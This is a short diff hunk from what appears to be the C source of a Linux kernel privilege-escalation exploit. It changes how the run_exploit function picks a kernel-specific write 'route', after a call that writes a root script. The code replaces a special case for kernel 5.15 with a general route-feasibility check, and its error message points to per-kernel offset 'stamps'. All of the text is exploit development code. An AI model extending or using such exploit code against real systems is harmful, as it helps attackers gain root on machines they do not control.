@@ -1049,12 +1049,10 @@ int run_exploit(int argc, char **argv) {
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
-  /* 5.15 has one window over the waiter and the other transports' copies
-   * stop short of it, so the kernel5 stamp is its only transport */
-  if (strncmp(active_offsets->uname_r, "5.15.", 5) == 0 &&
-      active_offsets->mcast_waiter_off <= 0) {
-    pr_error("5.15 needs the mcast stamp; add mcast_waiter_off, "
-             "mcast_buffer_size and mcast_lock_offset to %s\n",
+  /* every transport has its own measured fit test; a profile none of
+   * them fits has no way to write at all */
+  if (!select_route()) {
+    pr_error("no feasible route for %s: update ghostlock-extract stamps\n",
              active_offsets->uname_r);
     return 1;
   }
